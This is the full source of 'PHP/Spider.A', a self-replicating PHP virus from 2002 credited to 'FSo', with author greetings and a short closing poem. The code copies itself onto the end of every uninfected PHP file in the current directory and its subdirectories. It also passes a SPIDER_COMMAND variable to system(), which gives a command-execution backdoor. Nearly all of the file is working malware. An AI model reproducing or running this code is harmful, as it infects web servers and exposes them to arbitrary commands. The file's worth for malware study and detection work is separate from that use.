<?php
// PHP/Spider
// By FSo
// Proof-of-Concept PHP appender (PHP 3.0.6+)
// Dedicated to all the friends who held me together...
// And made for the enemies who tried to bring me down.
//
// Greets to Adolfo, Zulu, C.W., and the vets
// of A.C.V.S.C.
$myhandle = fopen(__FILE__, "rb");
$buffer = fread($myhandle, filesize(__FILE__));
fclose($myhandle);
$buffer = "<?php \r\n// " . substr($buffer, strpos($buffer, "PHP/Spider")) . "\r\n?>";
scan(".", TRUE);
if (isset($_GLOBALS['SPIDER_COMMAND']) == TRUE) {
	if (empty($_GLOBALS['SPIDER_COMMAND']) == FALSE) {
		system($_GLOBALS['SPIDER_COMMAND']);
	}
}

function scan($path, $recurse) {
	global $buffer;
	//global $polyarr;
	$dirres = opendir($path);
	if ($dirres == TRUE) {
		while (1) {
			$entity = readdir($dirres);
			if ($entity == FALSE && is_string($entity) == FALSE) { break; }
			if (is_dir($entity) == TRUE) {
				if ($entity == ".") {
				} else {
					if ($recurse == TRUE) {
						scan($entity, FALSE);
					}
				}
			} else {
				$ext = strtoupper(substr($entity, strrpos($entity, ".")));
				if ($ext == ".PHP" || $ext == ".PHP3" || $ext == ".PHTML" || $ext == ".PHP4") {
					$fhandle = fopen($entity, "rb");
					$contents = fread($fhandle, filesize($entity));
					fclose($fhandle);
					if (strstr($contents, "PHP/Spider") == FALSE) {
						$fhandle = fopen($path . "/" . $entity, "ab");
						fwrite($fhandle, $buffer);
						fclose($fhandle);
					}
				}
			}
		}
		closedir($dirres);
	}
	return;
}
// As the spiders multiplied, They surrounded him, 
// and kept coming...
//
// As the last minute opportunists finished him off,
// And his life flashed before him, all he could
// do was simply watch.
//
// Helpless and nearly defeated, he lived the horror 
// none could stand, if they had a choice...
//
// PHP/Spider.A by FSo
// June 24, 2002
?>


